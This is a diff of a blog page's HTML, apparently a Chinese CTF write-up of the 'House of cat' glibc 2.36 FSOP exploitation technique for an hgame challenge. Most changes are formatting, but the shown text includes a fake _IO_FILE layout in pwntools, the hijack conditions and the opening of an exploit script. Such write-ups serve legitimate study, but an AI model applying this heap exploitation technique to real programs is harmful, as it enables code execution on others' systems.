@@ -368,7 +368,7 @@
             <!-- WordCount start -->
             <div class="blank_box"></div>
             <span class="meta">
-              Estimated Reading Time <span class="post-count">5</span> Minutes
+              Estimated Reading Time <span class="post-count">6</span> Minutes
             </span>
             <div class="blank_box"></div>
             <span class="meta">
@@ -420,19 +420,19 @@
       <div class="col-lg-8 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
         
 
-        <h1 id="house-of-cat">House of cat</h1>
-<p>复现hgame week4 4nswer's gift</p>
+        <h1>House of cat</h1>
+<p>复现hgame week4 4nswer’s gift</p>
 <h2 id="题目">题目</h2>
-<h3 id="glibc版本-2.36">glibc版本 2.36</h3>
-<p><img src="/cn/Sagiring_markdown/House%20of%20cat/image-20231104111534552.png"></p>
+<h3 id="glibc版本-2-36">glibc版本 2.36</h3>
+<p>![](./House of cat/image-20231104111534552.png)</p>
 <h3 id="程序逻辑">程序逻辑</h3>
-<p><img src="/cn/Sagiring_markdown/House%20of%20cat/image-20231104111625351.png"></p>
+<p>![](./House of cat/image-20231104111625351.png)</p>
 <p>给了_IO_list_all的写入机会，且大小随意指定<code>malloc</code></p>
 <h2 id="解题思路">解题思路</h2>
 <p>首先有泄露libc地址。</p>
 <p>可以向malloc要一块很大的内存，让malloc调用mmap开辟空间。开辟出来的空间与libc偏移一致，fake_io便已知。</p>
 <p>高版本glibc 考虑打house of cat且有exit使用FSOP触发。</p>
-<h3 id="io_file_plus结构">_IO_FILE_plus结构</h3>
+<h3 id="IO-FILE-plus结构">_IO_FILE_plus结构</h3>
 <pre><code class="hljs python">fake_IO_FILE=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span>         <span class="hljs-comment">#0x0   _flags </span>
 fake_IO_FILE+=p64(<span class="hljs-number">0</span>)                <span class="hljs-comment">#0x8   _IO_read_ptr</span>
 fake_IO_FILE+=p64(<span class="hljs-number">0</span>)                <span class="hljs-comment">#0x10  _IO_read_end</span>
@@ -464,11 +464,11 @@ fake_IO_FILE+=<span class="hljs-string">b&#x27;\x00\x00\x00\x00&#x27;</span>   <
 fake_IO_FILE+=<span class="hljs-string">b&#x27;\x00\x00\x00\x00&#x27;</span>+ p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> <span class="hljs-comment">#0xc4  _unused2</span>
 fake_IO_FILE+=p64(<span class="hljs-number">0</span>)                <span class="hljs-comment">#0xd8  vtable</span>
 </code></pre>
-<h3 id="house-of-cat-1">House of cat</h3>
+<h3 id="House-of-cat">House of cat</h3>
 <p>触发IO函数的方式有FSOP、__malloc_assert</p>
 <p>通过修改vtable到虚表段中调用<code>_IO_wfile_seekof</code>-&gt;<code>_IO_switch_to_wget_mode</code></p>
 <p>其中<code>_IO_switch_to_wget_mode</code>的调用具体如下</p>
-<p><img src="/cn/Sagiring_markdown/House%20of%20cat/image-20231104112654061.png"></p>
+<p>![](./House of cat/image-20231104112654061.png)</p>
 <p>关键步骤如下。此时<code>rdi</code>为fp即我们伪造的fake_io结构，根据偏移构造地址，可以达到控制程序的目的。</p>
 <pre><code class="hljs assembly">mov rax, qword ptr [rdi + 0xa0]
 mov rdx, qword ptr [rax + 0x20]
@@ -479,17 +479,14 @@ call qword ptr [rax + 0x18] //system、setcontext</code></pre>
 <pre><code class="hljs c">_wide_data-&gt;_IO_read_ptr ！= _wide_data-&gt;_IO_read_end</code></pre>
 <pre><code class="hljs c">_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code></pre>
 <p>_wide_data可以指向自己的fake_io</p>
-<p><code>fp-&gt;_IO_save_base &lt; fp-&gt;_IO_backup_base</code> ---
-在<code>_wide_data=fake_io_addr+0x30</code>条件下,当然可以自主调整</p>
+<p><code>fp-&gt;_IO_save_base &lt; fp-&gt;_IO_backup_base</code>  — 在<code>_wide_data=fake_io_addr+0x30</code>条件下,当然可以自主调整</p>
 <pre><code class="hljs c">fp-&gt;_lock是一个可写地址（堆地址、libc中的可写地址）</code></pre>
 <pre><code class="hljs c">fp-&gt;_mode = <span class="hljs-number">0</span></code></pre>
 <pre><code class="hljs c">fp-vtable = _IO_wfile_jumps + <span class="hljs-number">0x30</span>  -&gt; FSOP
 fp-vtable = _IO_wfile_jumps + <span class="hljs-number">0x10</span>  -&gt; __malloc_assert</code></pre>
 <h2 id="另外">另外</h2>
-<p>pwndbg可以直接b _IO_Fuction 来进行调试
-，也可以<code>p *(sruct _IO_FILE_plus *) 0x233333</code>或者p
-_IO_list_all来打印结构。</p>
-<h2 id="exp">Exp</h2>
+<p>pwndbg可以直接b _IO_Fuction 来进行调试 ，也可以<code>p *(sruct _IO_FILE_plus *) 0x233333</code>或者p _IO_list_all来打印结构。</p>
+<h2 id="Exp">Exp</h2>
 <p>最后贴出exp</p>
 <pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * 
 <span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> p64,u64
@@ -739,7 +736,7 @@ r.interactive()</code></pre>
         <div id="toc" class="toc-article">
         <strong class="toc-title">目录</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#house-of-cat"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">House of cat</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">题目</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#glibc%E7%89%88%E6%9C%AC-2.36"><span class="toc-nav-number">1.1.1.</span> <span class="toc-nav-text">glibc版本 2.36</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E7%A8%8B%E5%BA%8F%E9%80%BB%E8%BE%91"><span class="toc-nav-number">1.1.2.</span> <span class="toc-nav-text">程序逻辑</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">解题思路</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#io_file_plus%E7%BB%93%E6%9E%84"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">_IO_FILE_plus结构</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#house-of-cat-1"><span class="toc-nav-number">1.2.2.</span> <span class="toc-nav-text">House of cat</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%8F%A6%E5%A4%96"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">另外</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#exp"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">Exp</span></a></li></ol></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">House of cat</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">题目</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#glibc%E7%89%88%E6%9C%AC-2-36"><span class="toc-nav-number">1.1.1.</span> <span class="toc-nav-text">glibc版本 2.36</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E7%A8%8B%E5%BA%8F%E9%80%BB%E8%BE%91"><span class="toc-nav-number">1.1.2.</span> <span class="toc-nav-text">程序逻辑</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">解题思路</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#IO-FILE-plus%E7%BB%93%E6%9E%84"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">_IO_FILE_plus结构</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#House-of-cat"><span class="toc-nav-number">1.2.2.</span> <span class="toc-nav-text">House of cat</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%8F%A6%E5%A4%96"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">另外</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Exp"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">Exp</span></a></li></ol></li></ol>
         
         </div>
       </aside>
